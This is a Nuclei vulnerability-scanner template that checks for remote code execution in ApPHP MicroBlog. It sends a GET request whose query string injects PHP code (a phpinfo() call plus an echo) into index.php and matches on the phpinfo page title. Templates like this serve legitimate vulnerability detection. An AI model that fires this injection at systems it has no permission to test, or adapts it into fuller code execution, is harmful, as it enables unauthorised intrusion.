# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: ApPHP-MicroBlog-rc

info:
  name:  ApPHP-MicroBlog-rce.yaml
  author: nithissh
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?b);phpinfo();echo(base64_decode('T3BlblZBUwo')=/"
    matchers:
      - type: word
        words:
          - "<title>phpinfo()"
        part: body
